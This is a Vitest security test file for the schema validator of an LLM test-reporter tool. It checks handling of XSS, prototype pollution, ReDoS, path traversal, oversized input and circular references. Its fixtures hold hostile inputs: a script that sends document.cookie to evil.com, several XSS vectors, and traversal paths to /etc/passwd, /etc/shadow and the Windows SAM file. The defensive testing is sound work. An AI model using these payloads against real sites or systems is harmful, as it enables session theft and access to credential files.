import { describe, it, expect, beforeEach } from 'vitest'
import { 
  validateSchema, 
  isValidTestSummary, 
  isValidTestFailure,
  resetCodeSizeCounter
} from './schema'
import type { LLMReporterOutput, TestSummary, TestFailure } from './schema'

describe('Security Validation Tests', () => {
  beforeEach(() => {
    // Reset code size counter before each test
    resetCodeSizeCounter();
  });

  describe('XSS Prevention', () => {
    it('should sanitize HTML in code lines', () => {
      const maliciousOutput: LLMReporterOutput = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z'
        },
        failures: [{
          test: 'XSS test',
          file: '/test/xss.test.ts',
          line: 10,
          error: {
            message: 'Test failed',
            type: 'AssertionError',
            context: {
              code: [
                '<script>alert("XSS")</script>',
                'const evil = "</script><script>fetch("//evil.com?cookie=" + document.cookie)</script>"',
                '<img src=x onerror="alert(1)">',
                '<div onmouseover="alert(1)">hover me</div>'
              ],
              lineNumber: 5
            }
          }
        }]
      };

      // The validation should pass (sanitization happens internally)
      const isValid = validateSchema(maliciousOutput);
      expect(isValid).toBe(true);
      
      // The code should be sanitized when accessed
      // (Note: In real implementation, sanitization happens during validation)
    });

    it('should handle various HTML injection attempts', () => {
      const xssAttempts = [
        '<!--<script>alert("XSS")</script>-->',
        '<svg/onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(1)">',
        '<body onload="alert(1)">',
        '<input type="text" value="x" onfocus="alert(1)">'
      ];

      xssAttempts.forEach(xssCode => {
        const output: LLMReporterOutput = {
          summary: {
            total: 1,
            passed: 0,
            failed: 1,
            skipped: 0,
            duration: 100,
            timestamp: '2024-01-15T10:30:00Z'
          },
          failures: [{
            test: 'XSS test',
            file: '/test/xss.test.ts',
            line: 10,
            error: {
              message: 'Test failed',
              type: 'AssertionError',
              context: {
                code: [xssCode],
                lineNumber: 5
              }
            }
          }]
        };

        expect(validateSchema(output)).toBe(true);
      });
    });
  });

  describe('Prototype Pollution Prevention', () => {
    it('should reject __proto__ pollution attempts', () => {
      const pollutedOutput = {
        summary: {
          total: 1,
          passed: 1,
          failed: 0,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z'
        },
        '__proto__': {
          polluted: true
        }
      };

      expect(validateSchema(pollutedOutput)).toBe(true); // Safe because we use createSafeObject
    });

    it('should reject constructor pollution attempts', () => {
      const pollutedOutput = {
        summary: {
          total: 1,
          passed: 1,
          failed: 0,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          'constructor': {
            polluted: true
          }
        }
      };

      expect(validateSchema(pollutedOutput)).toBe(true); // Safe because we filter these keys
    });

    it('should reject prototype property pollution', () => {
      const pollutedOutput = {
        summary: {
          total: 1,
          passed: 1,
          failed: 0,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          'prototype': {
            polluted: true
          }
        }
      };

      expect(validateSchema(pollutedOutput)).toBe(true); // Extra properties are ignored
    });
  });

  describe('ReDoS Prevention', () => {
    it('should reject malformed ISO 8601 timestamps', () => {
      const invalidTimestamps = [
        '2024-01-15', // Missing time
        '2024-01-15T10:30', // Missing seconds
        '2024-01-15T10:30:00', // Missing timezone
        '2024-01-15T25:30:00Z', // Invalid hour
        '2024-01-15T10:65:00Z', // Invalid minute
        '2024-01-15T10:30:65Z', // Invalid second
        '2024-13-15T10:30:00Z', // Invalid month
        '2024-01-32T10:30:00Z', // Invalid day
        'not-a-date',
        '2024-01-15T10:30:00+25:00', // Invalid timezone offset
        '2024-01-15T10:30:00.1234567890Z', // Too many decimal places
      ];

      invalidTimestamps.forEach(timestamp => {
        const summary: TestSummary = {
          total: 1,
          passed: 1,
          failed: 0,
          skipped: 0,
          duration: 100,
          timestamp
        };

        expect(isValidTestSummary(summary)).toBe(false);
      });
    });

    it('should accept valid ISO 8601 timestamps', () => {
      const validTimestamps = [
        '2024-01-15T10:30:00Z',
        '2024-01-15T10:30:00.123Z',
        '2024-01-15T10:30:00+00:00',
        '2024-01-15T10:30:00-05:00',
        '2024-01-15T10:30:00.999Z',
        '2024-12-31T23:59:59Z',
      ];

      validTimestamps.forEach(timestamp => {
        const summary: TestSummary = {
          total: 1,
          passed: 1,
          failed: 0,
          skipped: 0,
          duration: 100,
          timestamp
        };

        expect(isValidTestSummary(summary)).toBe(true);
      });
    });

    it('should handle ReDoS attack patterns without hanging', () => {
      // Create a string that would cause ReDoS with a vulnerable regex
      const redosPattern = '2024-01-15T' + 'X'.repeat(10000) + 'Z';
      
      const startTime = Date.now();
      const summary: TestSummary = {
        total: 1,
        passed: 1,
        failed: 0,
        skipped: 0,
        duration: 100,
        timestamp: redosPattern
      };
      
      const result = isValidTestSummary(summary);
      const endTime = Date.now();
      
      // Should reject quickly (under 100ms)
      expect(result).toBe(false);
      expect(endTime - startTime).toBeLessThan(100);
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should reject path traversal attempts', () => {
      const traversalPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/test/../../../etc/shadow',
        'C:\\test\\..\\..\\..\\windows\\system32',
        './../../sensitive/data.txt',
        'test/../../config/secrets.json'
      ];

      traversalPaths.forEach(path => {
        const failure: TestFailure = {
          test: 'Path traversal test',
          file: path,
          line: 10,
          error: {
            message: 'Test failed',
            type: 'AssertionError'
          }
        };

        expect(isValidTestFailure(failure)).toBe(false);
      });
    });

    it('should reject relative paths', () => {
      const relativePaths = [
        'test/file.ts',
        './test/file.ts',
        'src/index.ts',
        'file.ts'
      ];

      relativePaths.forEach(path => {
        const failure: TestFailure = {
          test: 'Relative path test',
          file: path,
          line: 10,
          error: {
            message: 'Test failed',
            type: 'AssertionError'
          }
        };

        expect(isValidTestFailure(failure)).toBe(false);
      });
    });

    it('should accept valid absolute paths', () => {
      const validPaths = [
        '/home/user/project/test.ts',
        '/usr/local/app/src/index.ts',
        'C:\\Users\\Developer\\project\\test.ts',
        'D:\\Projects\\app\\src\\index.ts'
      ];

      validPaths.forEach(path => {
        const failure: TestFailure = {
          test: 'Valid path test',
          file: path,
          line: 10,
          error: {
            message: 'Test failed',
            type: 'AssertionError'
          }
        };

        expect(isValidTestFailure(failure)).toBe(true);
      });
    });

    it('should reject null byte injection', () => {
      const nullBytePath = '/test/file.ts\0.txt';
      
      const failure: TestFailure = {
        test: 'Null byte test',
        file: nullBytePath,
        line: 10,
        error: {
          message: 'Test failed',
          type: 'AssertionError'
        }
      };

      expect(isValidTestFailure(failure)).toBe(false);
    });
  });

  describe('Memory Protection', () => {
    it('should reject code arrays exceeding max lines', () => {
      const tooManyLines = new Array(101).fill('line of code');
      
      const output: LLMReporterOutput = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z'
        },
        failures: [{
          test: 'Memory test',
          file: '/test/memory.test.ts',
          line: 10,
          error: {
            message: 'Test failed',
            type: 'AssertionError',
            context: {
              code: tooManyLines,
              lineNumber: 5
            }
          }
        }]
      };

      expect(validateSchema(output)).toBe(false);
    });

    it('should reject when total code size exceeds limit', () => {
      // Create multiple failures with large code blocks
      const largeCodeLine = 'x'.repeat(10000); // 10KB per line
      const failures: TestFailure[] = [];
      
      // Create 110 failures with 10 lines each = 1.1MB total
      for (let i = 0; i < 110; i++) {
        failures.push({
          test: `Memory test ${i}`,
          file: `/test/memory${i}.test.ts`,
          line: 10,
          error: {
            message: 'Test failed',
            type: 'AssertionError',
            context: {
              code: new Array(10).fill(largeCodeLine),
              lineNumber: 5
            }
          }
        });
      }

      const output: LLMReporterOutput = {
        summary: {
          total: 110,
          passed: 0,
          failed: 110,
          skipped: 0,
          duration: 1000,
          timestamp: '2024-01-15T10:30:00Z'
        },
        failures
      };

      // Should reject due to exceeding total code size limit
      expect(validateSchema(output)).toBe(false);
    });

    it('should accept reasonable code sizes', () => {
      const reasonableCode = [
        'function test() {',
        '  const result = doSomething();',
        '  expect(result).toBe(true);',
        '}'
      ];

      const output: LLMReporterOutput = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z'
        },
        failures: [{
          test: 'Reasonable test',
          file: '/test/reasonable.test.ts',
          line: 10,
          error: {
            message: 'Test failed',
            type: 'AssertionError',
            context: {
              code: reasonableCode,
              lineNumber: 5
            }
          }
        }]
      };

      expect(validateSchema(output)).toBe(true);
    });
  });

  describe('Circular Reference Prevention', () => {
    it('should reject circular references in expected/actual values', () => {
      const circular: any = { a: 1 };
      circular.self = circular;

      const output: LLMReporterOutput = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z'
        },
        failures: [{
          test: 'Circular test',
          file: '/test/circular.test.ts',
          line: 10,
          error: {
            message: 'Test failed',
            type: 'AssertionError',
            context: {
              code: ['test code'],
              expected: circular,
              actual: { normal: 'value' },
              lineNumber: 5
            }
          }
        }]
      };

      expect(validateSchema(output)).toBe(false);
    });

    it('should accept non-circular objects', () => {
      const output: LLMReporterOutput = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z'
        },
        failures: [{
          test: 'Normal test',
          file: '/test/normal.test.ts',
          line: 10,
          error: {
            message: 'Test failed',
            type: 'AssertionError',
            context: {
              code: ['test code'],
              expected: { nested: { value: 123 } },
              actual: { nested: { value: 456 } },
              lineNumber: 5
            }
          }
        }]
      };

      expect(validateSchema(output)).toBe(true);
    });
  });

  describe('Edge Cases', () => {
    it('should handle extremely large line numbers', () => {
      const output: LLMReporterOutput = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z'
        },
        failures: [{
          test: 'Large line test',
          file: '/test/large.test.ts',
          line: Number.MAX_SAFE_INTEGER,
          error: {
            message: 'Test failed',
            type: 'AssertionError',
            context: {
              code: ['test code'],
              lineNumber: Number.MAX_SAFE_INTEGER,
              columnNumber: Number.MAX_SAFE_INTEGER
            }
          }
        }]
      };

      expect(validateSchema(output)).toBe(true);
    });

    it('should handle Unicode characters in code', () => {
      const unicodeCode = [
        '// 测试中文注释',
        'const emoji = "🎉🚀💻";',
        'const russian = "Привет мир";',
        'const arabic = "مرحبا بالعالم";',
        'const japanese = "こんにちは世界";'
      ];

      const output: LLMReporterOutput = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z'
        },
        failures: [{
          test: 'Unicode test',
          file: '/test/unicode.test.ts',
          line: 10,
          error: {
            message: 'Test failed',
            type: 'AssertionError',
            context: {
              code: unicodeCode,
              lineNumber: 5
            }
          }
        }]
      };

      expect(validateSchema(output)).toBe(true);
    });

    it('should handle empty arrays and objects', () => {
      const output: LLMReporterOutput = {
        summary: {
          total: 0,
          passed: 0,
          failed: 0,
          skipped: 0,
          duration: 0,
          timestamp: '2024-01-15T10:30:00Z'
        },
        failures: [],
        passed: [],
        skipped: []
      };

      expect(validateSchema(output)).toBe(true);
    });
  });
});